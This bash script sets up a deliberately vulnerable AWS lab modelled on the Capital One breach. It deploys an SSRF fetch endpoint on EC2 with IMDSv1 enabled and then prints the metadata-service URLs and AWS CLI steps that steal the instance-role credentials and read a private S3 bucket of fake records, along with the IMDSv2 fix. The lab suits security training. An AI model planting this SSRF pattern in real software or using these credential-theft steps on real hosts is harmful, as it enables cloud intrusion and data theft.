#!/usr/bin/env bash
# Capital One–shaped lab: internet-facing app on EC2 that GETs ?url=
# (SSRF), IMDSv1, over-privileged instance role, private S3.
# Attack URL matches the blog:
#   http://<public-ip>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
set -euo pipefail

REGION="${AWS_REGION:-${AWS_DEFAULT_REGION:-us-east-1}}"
NAME="capone-imds-lab"
SUFFIX="$(openssl rand -hex 4)"
BUCKET="imds-ssrf-lab-${SUFFIX}"
ROLE="capone-imds-lab-instance"
PROFILE_NAME="capone-imds-lab-instance"
SG_NAME="${NAME}-sg"
INSTANCE_NAME="capone-imds-lab-web"

how_to_auth() {
  cat <<'EOF'

This script does not take an AWS account ID as an argument.
It deploys into whichever account the AWS CLI is already using.

  1. Install AWS CLI v2
  2. Use a throwaway account — not production
  3. aws configure --profile lab
  4. export AWS_PROFILE=lab
  5. export AWS_REGION=us-east-1    # optional; default is us-east-1
  6. ./setup.sh

The CLI calls sts:GetCallerIdentity and creates EC2, IAM, and S3 in THAT account.
You need a default VPC in the region and permission to create those resources.
Skip the confirm prompt with: ASSUME_YES=1 ./setup.sh

EOF
}

if ! command -v aws >/dev/null 2>&1; then
  echo "AWS CLI v2 is required." >&2
  how_to_auth
  exit 1
fi

if ! ID_JSON="$(aws sts get-caller-identity --output json 2>/dev/null)"; then
  echo "AWS CLI is not authenticated in this shell." >&2
  how_to_auth
  exit 1
fi

ACCOUNT="$(python3 -c "import json,sys; print(json.load(sys.stdin)['Account'])" <<<"$ID_JSON")"
ARN="$(python3 -c "import json,sys; print(json.load(sys.stdin)['Arn'])" <<<"$ID_JSON")"
CLI_PROFILE="${AWS_PROFILE:-default}"

echo "==> will create resources in THIS identity (not passed on the command line)"
echo "    AWS_PROFILE=$CLI_PROFILE"
echo "    account=$ACCOUNT"
echo "    arn=$ARN"
echo "    region=$REGION"
echo "    bucket=$BUCKET"
echo "    role=$ROLE"

if [[ "${ASSUME_YES:-}" != "1" ]]; then
  read -r -p "Deploy into account $ACCOUNT ($REGION)? [y/N] " ans
  case "$ans" in
    y|Y|yes|YES) ;;
    *) echo "Aborted. Set AWS_PROFILE to the throwaway account and re-run."; exit 1 ;;
  esac
fi

AMI="$(aws ssm get-parameters \
  --names /aws/service/ami-amazon-linux-latest/al2023-ami-kernel-default-x86_64 \
  --region "$REGION" \
  --query 'Parameters[0].Value' --output text)"

VPC="$(aws ec2 describe-vpcs --region "$REGION" --filters Name=isDefault,Values=true \
  --query 'Vpcs[0].VpcId' --output text)"
if [[ -z "$VPC" || "$VPC" == "None" ]]; then
  echo "No default VPC in $REGION. Create one or set a subnet yourself." >&2
  exit 1
fi
SUBNET="$(aws ec2 describe-subnets --region "$REGION" \
  --filters Name=vpc-id,Values="$VPC" Name=default-for-az,Values=true \
  --query 'Subnets[0].SubnetId' --output text)"

echo "==> S3 bucket (private) + sample object"
aws s3api create-bucket --bucket "$BUCKET" --region "$REGION" \
  $([[ "$REGION" == "us-east-1" ]] || echo --create-bucket-configuration LocationConstraint="$REGION") >/dev/null
aws s3api put-public-access-block --bucket "$BUCKET" --public-access-block-configuration \
  BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true
aws s3api put-bucket-tagging --bucket "$BUCKET" --tagging "TagSet=[{Key=Project,Value=${NAME}}]"
TMPOBJ="$(mktemp)"
cat >"$TMPOBJ" <<'EOF'
CONFIDENTIAL - LAB DATA ONLY (fake)
account_id,name,card_last4
1001,A. Rivera,4412
1002,J. Chen,7781
1003,M. Okonkwo,9920
note: This file exists only to demonstrate IMDSv1 credential theft via a misconfigured WAF.
EOF
aws s3 cp "$TMPOBJ" "s3://${BUCKET}/secret/customer-records.txt" --region "$REGION" >/dev/null
rm -f "$TMPOBJ"

echo "==> instance role (list buckets + read this bucket)"
if ! aws iam get-role --role-name "$ROLE" >/dev/null 2>&1; then
  aws iam create-role --role-name "$ROLE" --tags "Key=Project,Value=${NAME}" \
    --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ec2.amazonaws.com"},"Action":"sts:AssumeRole"}]}' >/dev/null
fi
POLICY="$(cat <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {"Sid":"ListBuckets","Effect":"Allow","Action":"s3:ListAllMyBuckets","Resource":"*"},
    {"Sid":"ReadWafBucket","Effect":"Allow","Action":["s3:GetObject","s3:ListBucket"],
     "Resource":["arn:aws:s3:::${BUCKET}","arn:aws:s3:::${BUCKET}/*"]}
  ]
}
EOF
)"
aws iam put-role-policy --role-name "$ROLE" --policy-name s3-read --policy-document "$POLICY"
aws iam attach-role-policy --role-name "$ROLE" \
  --policy-arn arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore >/dev/null 2>&1 || true
if ! aws iam get-instance-profile --instance-profile-name "$PROFILE_NAME" >/dev/null 2>&1; then
  aws iam create-instance-profile --instance-profile-name "$PROFILE_NAME" --tags "Key=Project,Value=${NAME}" >/dev/null
  aws iam add-role-to-instance-profile --instance-profile-name "$PROFILE_NAME" --role-name "$ROLE"
fi
echo "    waiting for instance profile..."
sleep 15

echo "==> security group (tcp/80)"
SG="$(aws ec2 create-security-group --region "$REGION" --group-name "$SG_NAME-$SUFFIX" \
  --description "Capital One IMDS SSRF lab - port 80" --vpc-id "$VPC" \
  --tag-specifications "ResourceType=security-group,Tags=[{Key=Project,Value=${NAME}},{Key=Name,Value=${SG_NAME}}]" \
  --query GroupId --output text)"
aws ec2 authorize-security-group-ingress --region "$REGION" --group-id "$SG" \
  --protocol tcp --port 80 --cidr 0.0.0.0/0 >/dev/null

USERDATA="$(mktemp)"
cat >"$USERDATA" <<'UD'
#!/bin/bash
set -eux
exec > /var/log/capone-ssrf-lab.log 2>&1
dnf install -y nginx python3

cat > /usr/local/bin/ssrf-fetch.py << 'PY'
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
from urllib.request import urlopen
from urllib.error import HTTPError, URLError

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        url = (parse_qs(urlparse(self.path).query).get("url") or [""])[0]
        if not url:
            self.send_response(200)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.end_headers()
            self.wfile.write(b"ssrf fetch: pass ?url=\n")
            return
        try:
            with urlopen(url, timeout=5) as r:
                body = r.read()
                self.send_response(200)
                self.send_header("Content-Type", r.headers.get_content_type() or "text/plain")
                self.end_headers()
                self.wfile.write(body)
        except HTTPError as e:
            payload = e.read() if e.fp else str(e).encode()
            self.send_response(e.code)
            self.send_header("Content-Type", "text/plain; charset=utf-8")
            self.end_headers()
            self.wfile.write(payload or f"HTTP Error {e.code}: {e.reason}".encode())
        except URLError as e:
            self.send_response(502)
            self.end_headers()
            self.wfile.write(str(e.reason).encode())
        except Exception as e:
            self.send_response(502)
            self.end_headers()
            self.wfile.write(str(e).encode())

    def log_message(self, fmt, *args):
        return

HTTPServer(("127.0.0.1", 8080), H).serve_forever()
PY
chmod +x /usr/local/bin/ssrf-fetch.py

cat > /etc/systemd/system/ssrf-fetch.service << 'UNIT'
[Unit]
Description=SSRF url fetch (lab)
After=network.target
[Service]
ExecStart=/usr/bin/python3 /usr/local/bin/ssrf-fetch.py
Restart=always
[Install]
WantedBy=multi-user.target
UNIT

cat > /etc/nginx/conf.d/ssrf.conf << 'NGX'
server {
    listen 80 default_server;
    listen [::]:80 default_server;
    server_name _;
    location / {
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header Host $host;
    }
}
NGX
rm -f /etc/nginx/conf.d/default.conf /usr/share/nginx/html/index.html || true

systemctl enable --now ssrf-fetch
systemctl enable --now nginx
echo READY > /tmp/lab-ready
UD

echo "==> EC2 t3.micro SSRF fetch, IMDSv1 (HttpTokens=optional)"
IID="$(aws ec2 run-instances --region "$REGION" \
  --image-id "$AMI" --instance-type t3.micro \
  --subnet-id "$SUBNET" --security-group-ids "$SG" \
  --iam-instance-profile "Name=${PROFILE_NAME}" \
  --metadata-options HttpTokens=optional,HttpEndpoint=enabled,HttpPutResponseHopLimit=1 \
  --user-data "file://${USERDATA}" \
  --tag-specifications "ResourceType=instance,Tags=[{Key=Project,Value=${NAME}},{Key=Name,Value=${INSTANCE_NAME}},{Key=LabBucket,Value=${BUCKET}}]" \
  --query 'Instances[0].InstanceId' --output text)"
rm -f "$USERDATA"
echo "    instance=$IID"
aws ec2 wait instance-running --region "$REGION" --instance-ids "$IID"
PUB="$(aws ec2 describe-instances --region "$REGION" --instance-ids "$IID" \
  --query 'Reservations[0].Instances[0].PublicIpAddress' --output text)"
echo "    public_ip=$PUB"
echo "    waiting for fetch endpoint (user-data install)..."
for i in $(seq 1 48); do
  if curl -fsS -m 3 "http://${PUB}/fetch?url=http://127.0.0.1/" >/dev/null 2>&1 \
     || curl -sS -m 3 -o /dev/null -w "%{http_code}" "http://${PUB}/fetch" | grep -qE '200|502'; then
    echo "    http ready"
    break
  fi
  sleep 5
done

cat <<EOF

============================================================
SSRF fetch is up. IMDSv1 is allowed (HttpTokens=optional).

The app GETs whatever you put in ?url= from the instance.
That is the same path as the blog / screenshots.

Public IP:     $PUB
Bucket:        s3://$BUCKET/secret/customer-records.txt
Instance:      $IID
Role:          $ROLE

In the browser address bar:

  http://${PUB}/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

then:

  http://${PUB}/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/${ROLE}

Then:

  aws configure --profile cloud-sec-lab
  aws sts get-caller-identity --profile cloud-sec-lab
  aws s3 ls --profile cloud-sec-lab
  aws s3 ls s3://${BUCKET} --recursive --profile cloud-sec-lab
  aws s3 cp s3://${BUCKET}/secret/customer-records.txt - --profile cloud-sec-lab

Require IMDSv2 (use the same AWS_PROFILE as setup):

  aws ec2 modify-instance-metadata-options --instance-id ${IID} --http-tokens required

Reload the same /fetch?url= URLs. Expect HTTP 401.

Destroy:

  ./destroy.sh

Port 80 is open. Tear it down when you are done.
============================================================
EOF
